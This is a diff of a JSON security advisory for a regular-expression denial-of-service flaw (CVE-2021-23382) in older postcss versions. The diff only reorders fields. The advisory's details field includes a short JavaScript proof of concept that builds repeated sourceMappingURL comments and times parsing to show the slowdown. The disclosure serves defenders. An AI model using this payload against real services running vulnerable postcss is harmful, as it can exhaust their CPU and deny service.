@@ -1,21 +1,68 @@
 {
-  "id": "GHSA-566m-qj78-rww5",
-  "summary": "Regular Expression Denial of Service in postcss",
-  "details": "The package postcss versions before 7.0.36 or between 8.0.0 and 8.2.13 are vulnerable to Regular Expression Denial of Service (ReDoS) via getAnnotationURL() and loadAnnotation() in lib/previous-map.js. The vulnerable regexes are caused mainly by the sub-pattern \n```regex\n\\/\\*\\s* sourceMappingURL=(.*)\n```\n\n### PoC\n```js\nvar postcss = require(\"postcss\")\nfunction build_attack(n) {\n    var ret = \"a{}\"\n    for (var i = 0; i < n; i++) {\n        ret += \"/*# sourceMappingURL=\"\n    }\n    return ret + \"!\";\n}\n```\n```js\npostcss.parse('a{}/*# sourceMappingURL=a.css.map */') for (var i = 1; i <= 500000; i++) {\n    if (i % 1000 == 0) {\n        var time = Date.now();\n        var attack_str = build_attack(i) try {\n            postcss.parse(attack_str) var time_cost = Date.now() - time;\n            console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost + \" ms\");\n        } catch (e) {\n            var time_cost = Date.now() - time;\n            console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost + \" ms\");\n        }\n    }\n}\n```",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-566m-qj78-rww5/GHSA-566m-qj78-rww5.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss",
+        "purl": "pkg:npm/postcss"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "8.0.0"
+            },
+            {
+              "fixed": "8.2.13"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-566m-qj78-rww5/GHSA-566m-qj78-rww5.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss",
+        "purl": "pkg:npm/postcss"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "7.0.36"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2021-23382"
   ],
-  "modified": "2025-01-14T08:57:01.148991Z",
-  "published": "2022-01-07T00:21:36Z",
   "database_specific": {
-    "nvd_published_at": "2021-04-26T16:15:00Z",
     "cwe_ids": [
       "CWE-400"
     ],
-    "severity": "MODERATE",
     "github_reviewed": true,
-    "github_reviewed_at": "2021-05-20T21:23:19Z"
+    "github_reviewed_at": "2021-05-20T21:23:19Z",
+    "nvd_published_at": "2021-04-26T16:15:00Z",
+    "severity": "MODERATE"
   },
+  "details": "The package postcss versions before 7.0.36 or between 8.0.0 and 8.2.13 are vulnerable to Regular Expression Denial of Service (ReDoS) via getAnnotationURL() and loadAnnotation() in lib/previous-map.js. The vulnerable regexes are caused mainly by the sub-pattern \n```regex\n\\/\\*\\s* sourceMappingURL=(.*)\n```\n\n### PoC\n```js\nvar postcss = require(\"postcss\")\nfunction build_attack(n) {\n    var ret = \"a{}\"\n    for (var i = 0; i < n; i++) {\n        ret += \"/*# sourceMappingURL=\"\n    }\n    return ret + \"!\";\n}\n```\n```js\npostcss.parse('a{}/*# sourceMappingURL=a.css.map */') for (var i = 1; i <= 500000; i++) {\n    if (i % 1000 == 0) {\n        var time = Date.now();\n        var attack_str = build_attack(i) try {\n            postcss.parse(attack_str) var time_cost = Date.now() - time;\n            console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost + \" ms\");\n        } catch (e) {\n            var time_cost = Date.now() - time;\n            console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost + \" ms\");\n        }\n    }\n}\n```",
+  "id": "GHSA-566m-qj78-rww5",
+  "modified": "2025-01-14T08:57:01.148991Z",
+  "published": "2022-01-07T00:21:36Z",
   "references": [
     {
       "type": "ADVISORY",
@@ -38,59 +85,12 @@
       "url": "https://snyk.io/vuln/SNYK-JS-POSTCSS-1255640"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "postcss",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/postcss"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "8.0.0"
-            },
-            {
-              "fixed": "8.2.13"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-566m-qj78-rww5/GHSA-566m-qj78-rww5.json"
-      }
-    },
-    {
-      "package": {
-        "name": "postcss",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/postcss"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "0"
-            },
-            {
-              "fixed": "7.0.36"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-566m-qj78-rww5/GHSA-566m-qj78-rww5.json"
-      }
-    }
-  ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "Regular Expression Denial of Service in postcss"
 }
